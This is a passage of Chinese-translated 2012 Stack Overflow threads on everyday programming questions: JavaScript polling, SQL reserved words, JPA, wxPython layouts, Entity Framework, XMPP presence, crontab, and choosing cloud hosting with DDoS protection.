**我该怎么做呢？**我想我使用类似的东西，`setInterval`但我不完全明白它是如何工作的。关于如何实现此功能的任何代码示例或想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:43:57.090

这是一些可以执行此操作的起始代码：

```
var lastSong = null;
var fetch = function(){
   $.getJSON('....', function(data) {
       if(data.length) {
           currentSong = data[0].some_unique_id
           if(lastSong != currentSong){
              //put code here to play song
              lastSong = currentSong;
           }
       }  
       setTimeout(fetch, 1000 * 60);
   });
}
fetch(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:43:52.470

`setInterval`以毫秒为单位的函数和超时间隔（x）作为输入。一旦指定了设置间隔，x 毫秒后将调用该函数。

[https://developer.mozilla.org/en/DOM/window.setInterval](https://developer.mozilla.org/en/DOM/window.setInterval)

这确实是您想要编写此功能的方式。只需创建一个函数，调用`getJSON`以 60000（一分钟）的间隔获取数据。

调用`getJSON`返回后，相应地处理数据，以查看结果是否与上次调用函数时发生了变化。

# android - 使用 Android SDK 检测附近移动设备的方法？

> ID：10603889
> 
> 赞同：5
> 
> 时间：2012-05-15T15:21:58.550
> 
> 标签：android, bluetooth, wifi, discovery, cellular-network

我正在考虑开发一个 Android 应用程序，它可以检测附近所有或大多数已打开的移动设备（iPhone、Android 等）。我不需要与这些设备交互，只需检测它们，并且要求检测到的设备不需要安装任何特殊/不寻常的应用程序。该应用程序只需要适用于典型的美国设备和网络。

我已经考虑了几种方法来做到这一点（以某种方式检测蓝牙、wifi 或蜂窝传输/标识符），但我正在寻找一种特定的实现方法来检测相对较大比例的附近设备。我不确定这些方法中的哪一种是可能/可行的，或者如何将它们付诸实践......

也许使用蓝牙：有没有办法使用 Android SDK 来检测不可发现的蓝牙设备（不是处于可发现模式）？[诺基亚开发者网站似乎建议使用服务发现协议 (SDP) 来实现这一点](http://www.developer.nokia.com/Community/Wiki/How_to_detect_a_bluetooth_device_being_in_non-discoverable_%28private%29_mode)，但我不确定这在 Android 中是否更普遍。 

也许使用蜂窝塔桅杆切换模拟？好的，这几乎肯定超出了 Android 的能力范围，但[本文建议可能有一种方法可以“模拟基站切换过程以触发静止的手机进行传输。手机以他们的 ID 和身份验证信号响应......”](http://www.ideasproject.com/ideas/3546)。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T15:30:14.247

我想你应该看到[这个](http://www.springerlink.com/content/q3w8335p2r245256/?MUD=MP)，它是一篇论文，你不能免费查看它，但在[摘要](http://springerlink3.metapress.com/content/q3w8335p2r245256/)中，它明确指出：

> 对蓝牙设备安全性的担忧导致了“不可发现”模式的规范，该模式可防止设备在蓝牙设备搜索过程中被列出。但是，**不可发现的蓝牙设备对于知道其地址或可以发现其地址的设备是可见的**。**本文讨论了使用增强的蛮力搜索攻击检测不可发现的蓝牙设备**。我们的结果表明，使用多个搜索设备和压缩包定时攻击不可发现的蓝牙设备的平均时间可以减少到**24 小时以下**。

但是对于一个安卓应用程序，你需要检测时间在几秒以内，而不是少于 24 小时，所以可能还没有一个实用的解决方案。

# security - 哪种基于云的可扩展 Web 服务最适合 DDOS 预防？

> ID：10603891
> 
> 赞同：11
> 
> 时间：2012-05-15T15:22:21.637
> 
> 标签：security, google-app-engine, amazon-web-services, cloud, ddos

我有一个我想开发和发布的网站的想法。这是一个网络应用程序，我想在某种形式的基于云的网络托管服务（即谷歌应用引擎、亚马逊网络服务、其他我可能不知道的......）上实现

我的问题是，即使我的项目是 100% 合法的，而且不是阴暗的，它也很容易受到偶尔的 DDOS 攻击。

我之前为 GAE 开发过，我对它非常有偏见。但是，我似乎找不到 Google 服务具有任何形式的集成 DDOS 保护。事实上，谷歌的文档指出，如果您认为自己遭受了 DDOS 攻击，您必须提供他们将研究的举证责任。如果他们认为您受到了攻击，他们将偿还您的使用费。否则，您将独自一人。

是否有更好的基于云的托管替代方案？我有我的偏好，但我没有嫁给任何特定类型的架构或编程语言。
用于 DDOS 保护的最佳基于云的 Web 托管选项是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T15:26:52.060

Google App Engine 确实提供 DoS 保护：请参阅 [Python](https://developers.google.com/appengine/docs/python/config/dos)、[Java](https://developers.google.com/appengine/docs/java/config/dos)和[Go](https://developers.google.com/appengine/docs/go/config/dos)文档。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-17T22:49:45.400

我实际上为 CloudFlare 工作，并认为我会加入...

“可能没有什么问题，因为有许多服务对最低计划是免费的。也许他们希望你有兴趣购买他们的高级服务。” 正确的。我们还可以通过功能、应用程序等从服务中获利。

[@RLH 我们可以为DDoS 缓解](http://blog.cloudflare.com/introducing-im-under-attack-mode)提供一些帮助。“我受到攻击”可以帮助缓解许多常见的 http:// 攻击，我们网络的基本性质也可以帮助缓解攻击。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T15:45:30.990

[CloudFlare](https://www.cloudflare.com/)似乎是您所需要的。我唯一不喜欢 CloudFlare 的是，即使您只想保护一个子域，您也必须为您的整个域使用他们的 DNS 服务器。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-30T08:29:03.563

您永远不会找到“免费”的 DDos 保护，因为为了保护您免受 DDos 的侵害，提供商必须“吞下”您的额外流量——因此使用带宽会花钱。

我知道的所有免费 DDos 保护服务，包括上面列出的服务，都是基于“可用性”提供的——这意味着它们只会保护您免受较小的攻击，并且只有在网络的其余部分可以处理它的情况下。

再说一次，这只是公平的。您无法获得便宜的 DDos 解决方案，因为解决 DDos 绝不是“免费”或“便宜”的。

然而，虽然“免费”的 DDoS 缓解尚不可靠，但有几种值得信赖且价格合理的解决方案。看看这个 Top10Review，它几乎总结了一切：

[http://website-security-and-performance-review.toptenreviews.com/](http://website-security-and-performance-review.toptenreviews.com/)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-18T14:29:24.140

由于您将此标记为“亚马逊网络服务”，我想我对这方面发表评论。

AWS 与知名网络安全供应商合作，自动为其网络提供 DDoS 保护服务。有时更复杂的（或有针对性的）攻击会通过。在这种情况下，您可以联系 AWS 安全团队，他们将帮助您对应用程序进行分类。

还值得注意的是，如果您巧妙地使用自动缩放，这对于缓解由 DDoS 引起的问题非常有帮助。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-22T07:00:37.627

在开始 Cloudflare 计划之前，有一些事情需要考虑，无论是免费的还是付费的：http: [//kwatog.com/blog/moving-out-of-cloudflare/](http://kwatog.com/blog/moving-out-of-cloudflare/)

我建议您尝试 Incloudibly [https://incloudibly.com/](https://incloudibly.com/) - 具有高达 10 Gb/s 的免费 DDoS 保护的可扩展云托管。

# sql - “SELECT * FROM user”附近的查询语法错误？

> ID：10603895
> 
> 赞同：1
> 
> 时间：2012-05-15T15:22:25.600
> 
> 标签：sql, sql-server, tsql

> **可能重复：**
> [关键字“用户”附近的语法不正确](https://stackoverflow.com/questions/6495629/incorrect-syntax-near-the-keyword-user)

我正在尝试在 SQL Server Management Studio 2008 中使用非常简单的 SQL 查询，确切的查询是：

```
SELECT * FROM User; 
```

但是当我尝试运行它时它给了我错误。

> 消息 156，级别 15，状态 1，第 1 行
> 关键字“用户”附近的语法不正确。

该表存在，当我尝试使用此语句选择任何其他表数据（通过替换表名）时，我会得到我想要的所有数据。有谁知道如何修复它？试图谷歌它，但没有得到答案。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-15T15:24:01.577

`User`是一个关键字。您将需要使用转义字符。尝试

```
SELECT * FROM [User] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:25:00.447

用户是保留字。你应该使用括号`[]`

```
SELECT * FROM [User] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T15:24:24.820

尝试这个：

```
SELECT * FROM [User]; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-15T15:24:28.410

`User`是保留的 SQL 关键字 - 尝试：

```
SELECT * FROM [User]; 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-15T15:24:30.370

用户是保留关键字，你能改变tname吗

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-05-15T15:24:31.910

“USER”是 SQL Server[保留关键字](http://msdn.microsoft.com/en-us/library/ms189822.aspx)。你需要逃避它：

```
SELECT * FROM [User]; 
```

或者：

```
SELECT * FROM "User"; 
```

# asp.net-mvc-3 - ASP.Net MVC3 右键菜单（在控制器的索引功能内）不显示“添加视图”或“转到视图”选项

> ID：10603896
> 
> 赞同：1
> 
> 时间：2012-05-15T15:22:31.657
> 
> 标签：asp.net-mvc-3, visual-studio-2010

从控制器区域内单击时，右键菜单突然停止显示“添加视图”或“转到视图”选项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:28:53.377

您是从一个新的 MVC 项目开始，还是从 ASP.NET Web 表单项目迁移到 MVC。你对 ? 做了什么`Project file`？尝试重新加载它，看看会发生什么。检查您的项目文件以查看您是否具有`ProjectTypeGuid`for MVC 项目类型。如果存在，VS 将为您提供添加视图/控制器的上下文菜单。

![在此处输入图像描述](../Images/95724545c41774c13d8cf49406bc47c5.png)

[这](http://techiesweb.net/how-to-get-add-view-add-controller-menus-in-solution-explorer-when-converting-existing-asp-net-web-for-project-to-mvc/)是一个示例，我在其中演示了如何在进行转换时编辑项目文件以在 ASP.NET 网站中包含 MVC 选项。

# sql - 如何获取 ID 列表的所有 JPA 对象，或者如何从这个 SQL 查询中进行 JPA 查询？

> ID：10603900
> 
> 赞同：2
> 
> 时间：2012-05-15T15:22:47.287
> 
> 标签：sql, jpa

我有一个有很多任务的项目。

我有一个 SQL 查询，它通过查询 TASKS 表返回 userId 的所有 projectIds ......这里是：

```
SELECT DISTINCT(projectId) 
FROM TASKS
WHERE userId = '55' AND status = 'IN_PROGRESS'; 
```

首先，我想知道是否有一种简单的 JPA 方法可以在给定项目 ID 列表的情况下获取所有项目对象？

其次，如何进行 JPA 查询来执行此 SQL 的功能？我猜它必须是这样的：

```
SELECT DISTINCT(Project p)
WHERE /*one of the tasks*/ p.tasks[].userId = '55' AND p.tasks[].status = 'IN_PROGRESS'; 
```

但我不知道。任何建议都非常感谢！

抢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T15:32:53.873

*我想知道是否有一种简单的 JPA 方法可以在给定项目 ID 列表的情况下获取所有项目对象*

```
select p from Project p where p.id in :projectIds 
```

*如何进行 JPA 查询来执行此 SQL 的功能？*

```
select distinct project.id 
from Task task
inner join task.project project
where task.userId = :userId and task.status = :status; 
```

阅读有关 JPQL 的文档，因为这是非常基本的东西。这是[关于 HQL 的 Hibernate 文档](http://docs.jboss.org/hibernate/core/3.6/reference/en-US/html_single/#queryhql)，它是 JPQL 的一个小超集。

# python - 并排放置两个 wx Grid

> ID：10603904
> 
> 赞同：1
> 
> 时间：2012-05-15T15:22:48.620
> 
> 标签：python, grid, wxpython, wxwidgets

我正在使用 python 2.7 和最新版本的 wxpython。

我需要并排放置 2 个网格并能够动态添加行。理想情况下，网格的大小应该动态增长，但“足够大”的大小暂时应该没问题。

我应该如何更改（和简化）我的代码来实现这一点？

```
class MatricesFrame(wx.BoxSizer):        
    def __init__(self, parentPanel):
        super(MatricesFrame, self).__init__(wx.HORIZONTAL)

        self.outputsMatrix = self.addEmptyGrid(parentPanel)
        self.inputsMatrix = self.addEmptyGrid(parentPanel)

        addRowsButton = wx.Button(parentPanel, -1, " Add Rows")
        addRowsButton.Bind(wx.EVT_BUTTON, self.addRows)
        self.Add(addRowsButton)

    def initResize(self, ev = None):
        self.inputsMatrix.SetSize((500, 500)) 
        self.outputsMatrix.SetSize((500, 500)) 

    def addEmptyGrid(self, parentPanel):   
        panel_ = wx.Panel(parentPanel)
        sizer_ = wx.BoxSizer(wx.VERTICAL)
        panel_.SetSizer(sizer_)
        panel_.SetSize((500, 500)) 
        matrix_ = wx.grid.Grid(panel_)
        matrix_.SetRowLabelSize(0) 
        matrix_.SetColLabelSize(0) 
        matrix_.CreateGrid(1,1)
        sizer_.Add(matrix_)
        self.Add(panel_)
        return matrix_

    def addRows(self, ev=None):   
        self.inputsMatrix.AppendRows(1)
        self.outputsMatrix.AppendRows(1)

class TestFrame(wx.Frame):
    def __init__(self, parent):
        super(TestFrame, self).__init__(parent, title='test', size=(1280, 950))               
        panel = wx.Panel(self)
        box = wx.BoxSizer(wx.VERTICAL)
        self.matricesFrame = MatricesFrame(panel)      
        box.Add(self.matricesFrame)
        panel.SetSizer(box)
        self.matricesFrame.initResize()
        self.Centre()
        self.Show()
        self.matricesFrame.initResize()
        wx.EVT_IDLE(wx.GetApp(),  wx.WakeUpIdle())           

def main():
    app = wx.App(False)
    t= TestFrame(None)
    app.MainLoop()

if __name__ == '__main__':
    main() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T01:41:43.627

对于初学者，如果您将自定义 Sizer 转换为自定义面板，我认为它会使您的代码更容易控制。看看我想出了什么

```
class MatricesPanel(wx.Panel):        
    def __init__(self, parent):
        super(MatricesPanel, self).__init__(parent)

        sizer = wx.BoxSizer(wx.HORIZONTAL)

        self.outputsMatrix = self.addEmptyGrid(sizer)
        self.inputsMatrix = self.addEmptyGrid(sizer)

        addRowsButton = wx.Button(self, -1, " Add Rows")
        addRowsButton.Bind(wx.EVT_BUTTON, self.addRows)
        sizer.Add(addRowsButton)

        self.SetSizer(sizer)
        self.SetAutoLayout(True)
        self.Layout()

    def initResize(self, ev = None):
        self.inputsMatrix.SetSize((500, 500)) 
        self.outputsMatrix.SetSize((500, 500))
        self.Layout()

    def addEmptyGrid(self, sizer):   
        matrix_ = wx.grid.Grid(self)
        matrix_.SetRowLabelSize(0) 
        matrix_.SetColLabelSize(0) 
        matrix_.CreateGrid(1,1)
        sizer.Add(matrix_)
        return matrix_

    def addRows(self, ev=None):   
        self.inputsMatrix.AppendRows(1)
        self.outputsMatrix.AppendRows(1)
        self.Layout() #refresh the frame 
```

使用 Panel 而不是 Sizer 可以大大简化您的“addEmptyGrid”方法，现在您可以尝试使用面板的大小而不是矩阵本身的大小来设置矩阵的大小。此外，如果您想添加滚动条（如果您添加很多行），这允许您灵活地从 wx.Panel 更改为 wx.lib.scrolledpanel.ScrolledPanel。

然后，您可以如下初始化新面板：

```
class TestFrame(wx.Frame):
    def __init__(self, parent):
        super(TestFrame, self).__init__(parent, title='test', size=(1280, 950))
        self.matricesPanel = MatricesPanel(self)

        sizer = wx.BoxSizer()
        sizer.Add(self.matricesPanel, flag=wx.EXPAND)
        self.SetSizer(sizer)

        self.Centre()
        self.Show()
        self.matricesPanel.initResize()

        wx.EVT_IDLE(wx.GetApp(),  wx.WakeUpIdle()) 
```

最后，据我所知， Grid 中的列具有固定宽度，因此您的 matrix.SetSize((500, 500)) 调用 ant' 做很多事情。如果你能找到一种方法来设置列的宽度，那么我建议你重写 initResize() 来设置相对于面板宽度的宽度。

# python - Pythonic 的方式来做到这一点？（乘以字符串中的某些元素）

> ID：10603905
> 
> 赞同：1
> 
> 时间：2012-05-15T15:22:49.330
> 
> 标签：python

我只想计算字符串的某些元素（其索引值 + 1 在**N中）的乘积。**

这工作正常：

```
start = 1
end = 1000000
N = (1, 10, 100, 1000, 10000, 100000, 1000000) 
product = 1

concatenated_numbers_str = ''.join([str(x) for x in range(1, end + 1)])

for n in N:
    product *= int(concatenated_numbers_str[n - 1])
print(product) 
```

但是有什么更好的方法来做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T16:12:48.163

我喜欢 Pavel 的回答，但应该是 n-1 而不是 n：

```
import operator
end = 1000000
N = (1, 10, 100, 1000, 10000, 100000, 1000000)
concatenated_numbers_str = ''.join([str(x) for x in range(1, end + 1)])
print reduce(operator.mul, [int(concatenated_numbers_str[n-1]) for n in N], 1) 
```

# wpf - Metro 应用程序中的 SetResourceReference 等价物是什么？

> ID：10603907
> 
> 赞同：1
> 
> 时间：2012-05-15T15:23:08.133
> 
> 标签：wpf, windows-8, windows-runtime, winrt-xaml

我试图在后面的代码中创建的控件中设置对样式的引用。通常在 WPF 中，我会使用 SetResourceReference 方法。但是，我看到 Metro 的 Button 属性上似乎不存在此方法。

Metro 应用程序中的等价物是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-23T20:55:31.947

我最终使用了[此处显示的 TryFindResource 的自定义实现](http://blog.functionalfun.net/2011/01/findresource-implementation-for.html)。使用不同答案中建议的 this.Resources 属性的问题是它不会在整个资源树中搜索可能在 App 资源中的资源。我提供的链接中的实现就是这样做的。它基于 Silverlight 中常见的具有相同问题的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T16:26:40.227

WinRT 和 Silverlight 一样，没有这种技术（它缺少“DynamicResource”标记扩展和随之而来的支持）。

您可以尝试以下方法之一：

*   设置[样式](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.frameworkelement.style.aspx)属性
*   设置[模板](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.controls.control.template.aspx)属性

例如，要设置样式，您可以执行以下操作。

使用[资源](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.frameworkelement.resources.aspx)：

```
<Page.Resources>
    <Style TargetType="Button" x:Key="boldButton">
        <Setter Property="FontWeight" Value="Bold" />
    </Style>               
</Page.Resources> 
```

和一个按钮：

```
<Button Name="btn" Content="Button" /> 
```

在后面的代码中：

```
btn.Style = this.Resources["boldButton"] as Style; 
```

# asp.net-mvc-2 - 我在 EF 中使用 Include() 但显示我的对象引用未设置的错误

> ID：10603908
> 
> 赞同：0
> 
> 时间：2012-05-15T15:23:09.180
> 
> 标签：asp.net-mvc-2, entity-framework-4

我在 EF 4.0 的 asp.net mvc 2 项目中使用 include 方法

这是我的数据库结构。

**Contact**
ContactID
ContactName
AddressID (FK)

**Address**
AddressID
CodePostal
Street

联系人可以包含地址，也可以不包含地址。在某些情况下，我不想要任何地址。在这种情况下，联系人表中的 AddressID 将为空。

我试着这样做

> _db.LocationContacts.Include("Contact.Address.City.Province.Country")

如果没有与联系人关联的地址，那就给我一个错误。有没有办法解决这种情况。

非常感谢。

这是错误消息：System.NullReferenceException：对象引用未设置为对象的实例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:32:37.590

因为您正在访问地址下为空的城市！

像这样使用它

```
var contacts=_db.LocationContacts.Include("Contact.Address").ToList(); 
```

这为您提供了与地址的联系。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T00:11:26.057

这条线...

```
var location = _db.LocationContacts
    .Include("Contact.Address.City.Province.Country").First(); 
```

...不抛出`NullReferenceException`. 当您访问 and 的某些其他属性或方法时，稍后会发生这种情况（`location.Address.City`对于某些位置，这是预期的，因为它允许具有 NULL 值）。`Address``Address`

您只需要检查是否`location.Address`是`null`：

```
if (location.Address != null)
{
    var city = location.Address.City; // OK
}
else
{
    // var city = location.Address.City; // Not OK
} 
```

# android - 更新不在 Google Play 上的内部 Android 应用？

> ID：10603912
> 
> 赞同：3
> 
> 时间：2012-05-15T15:23:16.687
> 
> 标签：android

我正在开发一个内部应用程序，它不会在 google play 上，我该如何更新这个应用程序？

非常感谢大家！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:45:06.117

如果您想在 node.js 中编写服务器代码，代码如下：

```
var app = express.createServer();
app.get('/version'', function(req, res){
    res.send('99');
});
app.listen(80); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:28:12.707

向人们发送新的 apk，或者让它检测何时有新版本，并告诉他们单击链接进行下载。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T22:10:59.593

我通过安装一个服务器来解决这个问题，该服务器保存一个文件`apk`和来自他们的信息，并使用一个进行通信和安装更新的库，就像我在工作中所做的那样，我将不得不等待这里的人在 github 上发布库它，但是如果有人在我在这里发布库之前需要使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T15:29:43.330

Google play 提供了一种非常强大的方式来推送给定应用程序的更新，如果您将覆盖这种方式，您将不得不“手动”重新部署您的应用程序（新 apk 发送到 x 个给定设备）

或者让您的应用程序将其内容链接到服务器，这样唯一要更新的将是服务器端的“数据”。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-07-13T08:38:57.613

简单地将 .apk 分发给您的内部用户可能是最简单的入门方法，但是您必须为此实施自定义更新过程。

到目前为止，有更多可用的选项可以处理更新过程，例如[私有渠道](https://support.google.com/a/answer/2494992)（适用于 Google Apps 用户）、用于内部分发的 Alpha/Beta 阶段（更像是 hack..）或复杂的[MDM](https://en.wikipedia.org/wiki/Mobile_device_management)解决方案。

请参阅我在[Google Play 部署中为内部公司用户提供](https://stackoverflow.com/questions/29371812/google-play-deployment-for-internal-company-user-only)[的答案](https://stackoverflow.com/a/31378605/1024108)，仅供参考。

# algorithm - 如何处理来自同一用户的不同 xmpp 优先级

> ID：10603914
> 
> 赞同：0
> 
> 时间：2012-05-15T15:23:27.590
> 
> 标签：algorithm, xmpp, google-talk

我想确定 Google Talk（又名 gchat）联系人是否离开、可用、dnd 或不可用（我认为这些是 gchat 上唯一可用的类型）。

到目前为止，我一直在使用 slimxmpp 与 gchat 交互并读取 xml 等...问题是联系人经常使用同一个帐户（例如电话和计算机）登录多个资源，每个资源都有自己的优先级和可用性。所以我想确定谁是“顶级 dawg”，我的意思是，我应该使用他们的哪些已签署资源来确定他们的可用性。

我认为这与优先级有很大关系，但我不确定如何，据我所知，两个资源可以具有相同的优先级和不同的可用性。

我意识到找到他们的“真实”可用性不会有一个完美的解决方案，但我认为谷歌会根据任何算法决定在联系人旁边显示什么颜色的可用性图标，所以我可以尝试弄清楚这一点也出来了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-16T02:33:25.210

这完全取决于您，没有标准答案（通常协议规范试图避免规定用户界面设计）。

您可以在界面中单独显示每个连接，也可以尝试巧妙地合并它们。您最终如何合并它们取决于您，但与 Robin 的回答（实际上是正确的）相反，我*建议*使用优先级，因为它反映了将成为用户发送给该联系人的任何消息的接收者的实际资源的状态。

例如，如果联系人有一个优先级为 5 的资源“dnd”，而另一个资源是“离开”优先级为 0，则显示“dnd”是有意义的，即使“离开”是更“可用”的状态. 这是因为当您向联系人的裸 JID 发送消息时，他们会将消息接收到“dnd”资源。

在优先级相同（具有相同优先级的两个资源）的情况下，您还有另一个选择。我建议将权重附加到每个可能的状态并显示“最可用”。我会以这种方式订购它们，例如：

1.  聊天 | dnd
2.  （无 - 标准“可用”）
3.  离开
4.  xa

这仍然留下了“聊天”和“dnd”的边缘情况。它们都是关于用户可用性的强烈（但相互矛盾的）陈述（即“跟我说话！”和“走开！”），因此可能应该优先于其他人。

确实，如果联系人在“dnd”和“聊天”中有两个具有相同优先级的资源，那么您就没有更多可以做的了，除非让最后收到的存在优先 - 因为这通常会指示他们的资源最近活跃于。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:59:38.873

那么，如果所有连接都显示为不可用，它们不会被视为不可用。如果他们有任何连接显示它们可用，那么它们在某些容量中可用。优先级与可用性无关。

当消息发往裸 JID（无特定连接）时，优先级对服务器路由消息起作用。如果用户有多个连接，服务器会将消息传递给具有最高优先级的连接。具有相同优先级的多个连接的行为可能不同，具体取决于服务器及其配置。例如，我相信 Google 将交付给所有资源，而 Openfire（默认情况下）将只交付给其中一个，基于内部算法。根据规范，这两种行为都是有效的。

# ruby-on-rails-3 - 从日期范围获取数据

> ID：10603916
> 
> 赞同：1
> 
> 时间：2012-05-15T15:23:31.973
> 
> 标签：ruby-on-rails-3, datetime, date, range, date-range

我想`room_requests`从表格中查看我的日期范围中包含的持续时间。这是我所做的：

此视图的控制器：

```
def not_confirmed_slots
  if params[:search] 
    @slots = RoomRequest.find(:all, :conditions => ['date >= ? and date =< ?', params[:start_date].strftime("%Y-%m-%d"), params[:end_date].strftime("%Y-%m-%d")]) 
        if @projects.size.zero? 
          flash[:notice] = "No result found" 
          @slots = RoomRequest.find(:all) 
        end 
  else 
    @slots = RoomRequest.all
  end
end 
```

和我的表格：

```
%h1= t('headers.reports.notConfirmedSlots')
  = form_tag not_confirmed_slots_reports_path, method: 'get' do
    %p
      = text_field_tag :start_date, nil,  :class => "datepicker", :placeholder => t('placeholders.reports.startDate')
    %p
      = text_field_tag :end_date, nil, :class=>"datepicker", :placeholder => t('placeholders.reports.endDate')
    .clear
       .action_bar
          = submit_tag t('buttons.reports.generate'), {class: "button blue"} 
```

但是每次我提交带有日期的表格时，它都会列出我所有来自 db 的 room_requests - 有什么提示吗？

哦，这是部分内容（与搜索表单的视图相同）：

```
%table
  - @slots.each do |s|
    %tr
      %td
        = s.bookers_name
      %td
        = s.request_type 
```

# java - Android：增加整数会导致分配

> ID：10603922
> 
> 赞同：2
> 
> 时间：2012-05-15T15:23:58.933
> 
> 标签：java, android

以下行出现在 Eclipse 的分配窗格中：

```
Alloc Order       Allocation Size           Allocated Class
509               12                        java.lang.Integer 
```

它引用了这行java代码：

```
MyInteger++; 
```

我稍微改变了它，但它仍然会导致分配。

```
MyInteger=MyInteger+1;
MyInteger=MyInteger+MyIntegerIncrementor; 
```

为什么这些代码行会导致分配？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:30:26.867

由于`Integer`是[不可变](http://docs.oracle.com/javase/tutorial/essential/concurrency/immutable.html)的，每次增加它时都会创建一个新对象，因此分配。

# javascript - 自定义形状垂直滑块

> ID：10603929
> 
> 赞同：0
> 
> 时间：2012-05-15T15:24:21.613
> 
> 标签：javascript, jquery-ui, masking

我必须制作一个灯泡形状（即使是椭圆也可以）垂直滑块的原型。我开始使用[http://jqueryui.com/demos/slider/slider-vertical.html](http://jqueryui.com/demos/slider/slider-vertical.html)并将父元素的形状更改为所需的（现在为椭圆）形状。问题是，当我拖动滑块时，它会以矩形方式增长，因此不会采用椭圆形（因为它是父元素）。您能否建议是否有更好的方法来实现这一目标。如果这是正确的方法，那么我应该如何从边缘遮住颜色，以使滑块背景也变成椭圆形。

问题参考：[http ://share.axure.com/UMILTD/](http://share.axure.com/UMILTD/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:53:05.937

我建议使用`border-radius`CSS 属性来实现这种效果。您可以将`border-radius`父级的 设置为创建形状，然后将其设置`overflow`为`hidden`以防止其后面的矩形显示出来。

我在这里有一个活生生的例子 - [http://jsfiddle.net/qUbZf/3/](http://jsfiddle.net/qUbZf/3/)。Chrome 中的溢出处理方式似乎确实存在一些问题，但在 Firefox 和 IE9 中看起来不错。

IE < 9 不支持`border-radius`，但该形状将简单地回退到一个盒子并且仍然可以使用。

# ubuntu - crontab 执行带有属性文件的 jar

> ID：10603939
> 
> 赞同：1
> 
> 时间：2012-05-15T15:24:54.520
> 
> 标签：ubuntu, properties, jar, terminal, crontab

我正在尝试使用 crontab 每分钟执行一个 jar。

如果我通过终端执行它，这个 jar 运行良好。关键是 jar 在执行时从位于同一目录（与 jar 相同级别）中的两个 java 属性文件中读取一些常量。当我尝试通过 crontab 执行它时出现问题，它不起作用，我认为这可能是因为找不到此属性文件。

那么...如何在 crontab 的“代码”中设置这两个属性文件的路径？

到目前为止，我的 crontab '代码'：

```
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=myuser@gmail.com
HOME=/

*/1 * * * * /usr/local/jdk/bin/java -jar /home/myuser/Desktop/Pre/myjar.jar 
```

先感谢您，

# sql - 根据第二个 select 语句选择要包含在 select 中的列

> ID：10603940
> 
> 赞同：0
> 
> 时间：2012-05-15T15:24:56.633
> 
> 标签：sql, oracle, crystal-reports

我有一个第三方程序，它使用数据库表在屏幕上显示用户创建的（在应用程序内）字段，所以我有一个名为 User_Created_Fields 的表，看起来像

```
TABLE         FIELD_NAME          GROUP     LABEL
products      charge1             1         First Charge
products      begin_date1         1         Begin Date
products      end_date1           1         End Date 
products      charge2             2         First Charge
products      begin_date2         2         Begin Date
products      end_date2           2         End Date 
```

当应用程序在表格中看到它时，它会在应用程序中显示以下内容

```
Group 1
First Charge   *text area for input*
Begin Date     *text area for input*
End Date       *text area for input*

----------

Group 2
First Charge  *text area for input* 
Begin Date     *text area for input*
End Date       *text area for input* 
```

应用程序将这些字段的数据保存到在 User_Created_Fields 表中指定的表和字段名称中，因此 PRODUCTS.charge1 和 PRODUCTS.charge2 字段（与相应的日期字段相同）。

现在我需要创建一个报告，选择存储在 Products 表中的值，但是......因为字段将由用户添加，所以我需要选择来自 User_Created_Fields 表中的 Table 和 field_name 列的列。

所以输出看起来像

`PRODUCTS.Begin_date, PRODUCTS.End_date, PRODUCTS.Charge1, User_Created_Fields.Group`

查询看起来（非常粗略）像

```
select  (select Table ||'.'||field_name  from User_Created_Fields where Label='First Charge' and Group= (select Group from User_created_fields where label ='First Charge') ) from Products 
```

这将进入一个水晶报告，所以我不能像往常一样使用 sql 来生成 sql。可能还有一种更水晶的方式来做到这一点，但我不知道它是什么。显然，此信息将与销售详细信息相结合，但为了简单起见，我将那部分省略了，因为这部分足够复杂。我正在使用水晶 11 和甲骨文 10

如果你已经阅读了所有这些，你应该得到奖励......谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T18:50:22.860

据我所知，Crystal Reports 可以访问存储过程而不是 sql 语句。因此，将用于创建 sql 语句的代码放入存储过程中，并将其用作报告的数据源。

您可能必须确定要支持的最大列数并始终返回该列数以使水晶满意。

# ios - iOS 中的键值观察。更改字典中的错误

> ID：10603945
> 
> 赞同：-1
> 
> 时间：2012-05-15T15:25:07.530
> 
> 标签：ios, ios4, key-value-observing

